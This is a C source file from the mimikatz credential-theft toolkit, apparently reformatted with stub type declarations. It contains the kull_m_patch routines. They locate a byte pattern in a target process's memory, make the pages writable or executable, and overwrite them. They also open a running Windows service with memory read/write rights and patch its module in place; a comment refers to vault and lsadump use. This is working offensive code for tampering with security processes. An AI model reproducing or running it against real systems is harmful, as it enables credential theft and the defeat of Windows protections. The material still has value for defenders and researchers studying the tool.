#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_39__   TYPE_9__ ;
typedef  struct TYPE_38__   TYPE_8__ ;
typedef  struct TYPE_37__   TYPE_7__ ;
typedef  struct TYPE_36__   TYPE_6__ ;
typedef  struct TYPE_35__   TYPE_5__ ;
typedef  struct TYPE_34__   TYPE_4__ ;
typedef  struct TYPE_33__   TYPE_3__ ;
typedef  struct TYPE_32__   TYPE_2__ ;
typedef  struct TYPE_31__   TYPE_1__ ;
typedef  struct TYPE_30__   TYPE_11__ ;
typedef  struct TYPE_29__   TYPE_10__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  wchar_t ;
struct TYPE_39__ {scalar_t__ address; int /*<<< orphan*/ * member_1; int /*<<< orphan*/ * member_0; } ;
struct TYPE_31__ {int /*<<< orphan*/ * hMemory; } ;
struct TYPE_32__ {int /*<<< orphan*/  size; TYPE_1__ kull_m_memoryAdress; } ;
struct TYPE_38__ {TYPE_2__ kull_m_memoryRange; scalar_t__ result; } ;
struct TYPE_35__ {scalar_t__ off0; } ;
struct TYPE_34__ {size_t Length; scalar_t__ Pattern; } ;
struct TYPE_33__ {size_t Length; scalar_t__ Pattern; } ;
struct TYPE_37__ {int MinBuildNumber; TYPE_5__ Offsets; TYPE_4__ Patch; TYPE_3__ Search; } ;
struct TYPE_36__ {scalar_t__ dwCurrentState; int /*<<< orphan*/  dwProcessId; } ;
struct TYPE_30__ {int /*<<< orphan*/  SizeOfImage; TYPE_1__ DllBase; } ;
struct TYPE_29__ {int Protect; } ;
typedef  size_t SIZE_T ;
typedef  TYPE_6__ SERVICE_STATUS_PROCESS ;
typedef  TYPE_7__* PKULL_M_PATCH_GENERIC ;
typedef  int /*<<< orphan*/  (* PKULL_M_PATCH_CALLBACK ) (int,int /*<<< orphan*/ **) ;
typedef  TYPE_8__* PKULL_M_MEMORY_SEARCH ;
typedef  int /*<<< orphan*/  PKULL_M_MEMORY_HANDLE ;
typedef  TYPE_9__* PKULL_M_MEMORY_ADDRESS ;
typedef  int /*<<< orphan*/  PCWSTR ;
typedef  int /*<<< orphan*/  NTSTATUS ;
typedef  TYPE_10__ MEMORY_BASIC_INFORMATION ;
typedef  scalar_t__ LPBYTE ;
typedef  scalar_t__ LONG ;
typedef  TYPE_11__ KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION ;
typedef  TYPE_8__ KULL_M_MEMORY_SEARCH ;
typedef  TYPE_9__ KULL_M_MEMORY_ADDRESS ;
typedef  int /*<<< orphan*/  HANDLE ;
typedef  int DWORD ;
typedef  int BOOL ;

/* Variables and functions */
 int FALSE ; 
 int /*<<< orphan*/  KULL_M_MEMORY_GLOBAL_OWN_HANDLE ; 
 int /*<<< orphan*/  KULL_M_MEMORY_TYPE_PROCESS ; 
 int /*<<< orphan*/  LPTR ; 
 scalar_t__ LocalAlloc (int /*<<< orphan*/ ,size_t) ; 
 int /*<<< orphan*/  LocalFree (scalar_t__) ; 
 int MIMIKATZ_NT_BUILD_NUMBER ; 
 int /*<<< orphan*/  OpenProcess (int,int,int /*<<< orphan*/ ) ; 
 int PAGE_EXECUTE_READWRITE ; 
 int PAGE_READWRITE ; 
 int /*<<< orphan*/  PRINT_ERROR (char*) ; 
 int /*<<< orphan*/  PRINT_ERROR_AUTO (char*) ; 
 int PROCESS_QUERY_INFORMATION ; 
 int PROCESS_VM_OPERATION ; 
 int PROCESS_VM_READ ; 
 int PROCESS_VM_WRITE ; 
 scalar_t__ SERVICE_RUNNING ; 
 int TRUE ; 
 int /*<<< orphan*/  kprintf (char*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  kull_m_memory_close (int /*<<< orphan*/ ) ; 
 int kull_m_memory_copy (TYPE_9__*,TYPE_9__*,size_t) ; 
 scalar_t__ kull_m_memory_open (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int kull_m_memory_protect (TYPE_9__*,size_t,int,int*) ; 
 scalar_t__ kull_m_memory_query (TYPE_9__*,TYPE_10__*) ; 
 scalar_t__ kull_m_memory_search (TYPE_9__*,size_t,TYPE_8__*,int) ; 
 scalar_t__ kull_m_process_getVeryBasicModuleInformationsForName (int /*<<< orphan*/ ,int /*<<< orphan*/ ,TYPE_11__*) ; 
 scalar_t__ kull_m_service_getUniqueForName (int /*<<< orphan*/ ,TYPE_6__*) ; 

BOOL kull_m_patch(PKULL_M_MEMORY_SEARCH sMemory, PKULL_M_MEMORY_ADDRESS pPattern, SIZE_T szPattern, PKULL_M_MEMORY_ADDRESS pPatch, SIZE_T szPatch, LONG offsetOfPatch, PKULL_M_PATCH_CALLBACK pCallBackBeforeRestore, int argc, wchar_t * args[], NTSTATUS * pRetCallBack)
{
	BOOL result = FALSE, resultBackup = !pCallBackBeforeRestore, resultProtect = TRUE;
	KULL_M_MEMORY_ADDRESS destination = {NULL, sMemory->kull_m_memoryRange.kull_m_memoryAdress.hMemory};
	KULL_M_MEMORY_ADDRESS backup = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	MEMORY_BASIC_INFORMATION readInfos;
	NTSTATUS status;
	DWORD flags, oldProtect = 0, tempProtect = 0;
	
	if(kull_m_memory_search(pPattern, szPattern, sMemory, TRUE))
	{
		destination.address = (LPBYTE) sMemory->result + offsetOfPatch;

		if(!resultBackup)
			if(backup.address = LocalAlloc(LPTR, szPatch))
				resultBackup = kull_m_memory_copy(&backup, &destination, szPatch);

		if(resultBackup)
		{
			if(kull_m_memory_query(&destination, &readInfos))
			{
				flags = readInfos.Protect & ~0xff;
				if((readInfos.Protect & 0x0f) && ((readInfos.Protect & 0x0f) < PAGE_READWRITE))
					tempProtect = PAGE_READWRITE;
				else if((readInfos.Protect & 0xf0) && ((readInfos.Protect & 0xf0) < PAGE_EXECUTE_READWRITE))
					tempProtect = PAGE_EXECUTE_READWRITE;
				
				if(tempProtect)
					resultProtect = kull_m_memory_protect(&destination, szPatch, tempProtect | flags, &oldProtect);

				if(resultProtect)
				{
					if(result = kull_m_memory_copy(&destination, pPatch, szPatch))
					{
						if(pCallBackBeforeRestore)
						{
							status = pCallBackBeforeRestore(argc, args);
							if(pRetCallBack)
								*pRetCallBack = status;
							result = kull_m_memory_copy(&destination, &backup, szPatch);
						}
					}
					if(oldProtect)
						kull_m_memory_protect(&destination, szPatch, oldProtect, NULL);
				}
			}
			if(backup.address)
				LocalFree(backup.address);
		}
	}
	return result;
}

PKULL_M_PATCH_GENERIC kull_m_patch_getGenericFromBuild(PKULL_M_PATCH_GENERIC generics, SIZE_T cbGenerics, DWORD BuildNumber)
{
	SIZE_T i;
	PKULL_M_PATCH_GENERIC current = NULL;

	for(i = 0; i < cbGenerics; i++)
	{
		if(generics[i].MinBuildNumber <= BuildNumber)
			current = &generics[i];
		else break;
	}
	return current;
}

BOOL kull_m_patch_genericProcessOrServiceFromBuild(PKULL_M_PATCH_GENERIC generics, SIZE_T cbGenerics, PCWSTR processOrService, PCWSTR moduleName, BOOL isService) // to do for process // to do callback ! (vault & lsadump)
{
	BOOL result = FALSE;
	SERVICE_STATUS_PROCESS ServiceStatusProcess;
	PKULL_M_MEMORY_HANDLE hMemory;
	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION iModule;
	HANDLE hProcess;
	KULL_M_MEMORY_ADDRESS
		aPatternMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE},
		aPatchMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	KULL_M_MEMORY_SEARCH sMemory;

	PKULL_M_PATCH_GENERIC currenReferences;

	if(currenReferences = kull_m_patch_getGenericFromBuild(generics, cbGenerics, MIMIKATZ_NT_BUILD_NUMBER))
	{
		aPatternMemory.address = currenReferences->Search.Pattern;
		aPatchMemory.address = currenReferences->Patch.Pattern;
		if(kull_m_service_getUniqueForName(processOrService, &ServiceStatusProcess))
		{
			if(ServiceStatusProcess.dwCurrentState >= SERVICE_RUNNING)
			{
				if(hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION, FALSE, ServiceStatusProcess.dwProcessId))
				{
					if(kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, hProcess, &hMemory))
					{
						if(kull_m_process_getVeryBasicModuleInformationsForName(hMemory, moduleName, &iModule))
						{
							sMemory.kull_m_memoryRange.kull_m_memoryAdress = iModule.DllBase;
							sMemory.kull_m_memoryRange.size = iModule.SizeOfImage;

							if(result = kull_m_patch(&sMemory, &aPatternMemory, currenReferences->Search.Length, &aPatchMemory, currenReferences->Patch.Length, currenReferences->Offsets.off0, NULL, 0, NULL, NULL))
								kprintf(L"\"%s\" service patched\n", processOrService);
							else
								PRINT_ERROR_AUTO(L"kull_m_patch");
						} else PRINT_ERROR_AUTO(L"kull_m_process_getVeryBasicModuleInformationsForName");
						kull_m_memory_close(hMemory);
					}
				} else PRINT_ERROR_AUTO(L"OpenProcess");
			} else PRINT_ERROR(L"Service is not running\n");
		} else PRINT_ERROR_AUTO(L"kull_m_service_getUniqueForName");
	} else PRINT_ERROR(L"Incorrect version in references\n");

	return result;
}

